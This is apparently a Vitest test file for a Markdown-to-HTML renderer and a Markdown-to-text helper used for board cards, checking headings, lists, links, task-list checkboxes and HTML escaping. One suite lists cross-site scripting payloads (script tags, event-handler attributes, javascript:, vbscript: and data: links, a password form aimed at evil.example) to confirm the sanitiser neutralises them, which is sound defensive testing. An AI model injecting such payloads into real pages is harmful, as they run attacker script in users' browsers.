import { describe, it, expect } from 'vitest';
import { renderMarkdown, markdownToText } from './markdown.js';

// Rendered into a detached element, the way {@html} puts it in the page.
function rendered(text) {
  const el = document.createElement('div');
  el.innerHTML = renderMarkdown(text);
  return el;
}

describe('renderMarkdown', () => {
  it('renders the Markdown cards are written in', () => {
    const el = rendered(
      '# Plan\n\nSome **bold**, *em* and `code`.\n\n- one\n- two\n\n1. first\n\n```\nlet x = 1;\n```\n\n> quoted\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );
    expect(el.querySelector('h1').textContent).toBe('Plan');
    expect(el.querySelector('strong').textContent).toBe('bold');
    expect(el.querySelector('em').textContent).toBe('em');
    expect(el.querySelector('p code').textContent).toBe('code');
    expect(el.querySelectorAll('ul li')).toHaveLength(2);
    expect(el.querySelector('ol li').textContent).toBe('first');
    expect(el.querySelector('pre code').textContent).toBe('let x = 1;\n');
    expect(el.querySelector('blockquote').textContent.trim()).toBe('quoted');
    expect(el.querySelectorAll('td')).toHaveLength(2);
  });

  it('keeps a single newline as a line break, as typed', () => {
    expect(rendered('line one\nline two').querySelector('br')).not.toBeNull();
  });

  it('shows task lists as checkboxes nobody can tick', () => {
    const boxes = rendered('- [x] done\n- [ ] todo').querySelectorAll('input[type="checkbox"]');
    expect(boxes).toHaveLength(2);
    expect(boxes[0].checked).toBe(true);
    expect([...boxes].every((b) => b.disabled)).toBe(true);
  });

  it('opens links in a new tab, without handing over the page', () => {
    const a = rendered('[docs](https://example.com/x)').querySelector('a');
    expect(a.getAttribute('href')).toBe('https://example.com/x');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow');
  });

  it('turns an image into a link instead of loading it', () => {
    const el = rendered('![the chart](https://example.com/c.png)');
    expect(el.querySelector('img')).toBeNull();
    const a = el.querySelector('a');
    expect(a.getAttribute('href')).toBe('https://example.com/c.png');
    expect(a.textContent).toBe('the chart');
  });

  it('shows HTML typed into a card as text', () => {
    const el = rendered('Give every page a real <title>.\n\n<div>block</div>');
    expect(el.querySelector('title, div')).toBeNull();
    expect(el.textContent).toContain('a real <title>.');
    expect(el.textContent).toContain('<div>block</div>');
  });

  it('empty text renders nothing', () => {
    expect(renderMarkdown('')).toBe('');
    expect(renderMarkdown(null)).toBe('');
  });
});

// Anyone who can see a board can write its cards, agents included. None of
// these may come out as something that runs.
describe('renderMarkdown with hostile card text', () => {
  const SCRIPTY = [
    '<script>window.__pwned = 1</script>',
    '<img src=x onerror="window.__pwned = 1">',
    '<svg onload="window.__pwned = 1"></svg>',
    '<iframe src="javascript:window.__pwned = 1"></iframe>',
    '<a href="javascript:window.__pwned = 1">x</a>',
    '<style>body { display: none }</style>',
    '<form action="https://evil.example"><input name="password"></form>',
    '[click](javascript:window.__pwned=1)',
    '[click](JaVaScRiPt:window.__pwned=1)',
    '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '[click](vbscript:msgbox(1))',
    '![x](javascript:window.__pwned=1)',
    '<javascript:window.__pwned=1>',
    '[x](https://ok.example "a\\" onmouseover=\\"window.__pwned = 1")',
    '`<img src=x onerror=alert(1)>`',
  ];

  it.each(SCRIPTY)('%s', (text) => {
    const el = rendered(text);
    expect(el.querySelector('script, img, svg, iframe, style, form, object, embed')).toBeNull();
    for (const node of el.querySelectorAll('*')) {
      for (const attr of node.attributes) {
        expect(attr.name).not.toMatch(/^on/i);
      }
      const href = node.getAttribute('href');
      if (href !== null) expect(href).toMatch(/^https:\/\//);
    }
    // Inputs only ever come from a task list, and those are disabled checkboxes.
    for (const input of el.querySelectorAll('input')) {
      expect(input.type).toBe('checkbox');
      expect(input.disabled).toBe(true);
    }
  });
});

describe('markdownToText', () => {
  it('keeps the words and drops the syntax', () => {
    expect(
      markdownToText('# Plan\n\nSome **bold** [link](https://x.example) and `code`.\n\n- one\n- [ ] two\n\n> quoted'),
    ).toBe('Plan Some bold link and code. one two quoted');
  });

  it('keeps code, tables and images as their text', () => {
    expect(markdownToText('```\nlet x = 1;\n```')).toBe('let x = 1;');
    expect(markdownToText('| a | b |\n|---|---|\n| 1 | 2 |')).toBe('a b 1 2');
    expect(markdownToText('![the chart](https://x.example/c.png)')).toBe('the chart');
  });

  it('returns text, not HTML', () => {
    expect(markdownToText('a < b & c "d" <title>')).toBe('a < b & c "d" <title>');
  });

  it('runs line breaks together, as the tile does', () => {
    expect(markdownToText('one\ntwo\n\nthree')).toBe('one two three');
  });

  it('is empty for no text', () => {
    expect(markdownToText('')).toBe('');
    expect(markdownToText(undefined)).toBe('');
  });
});
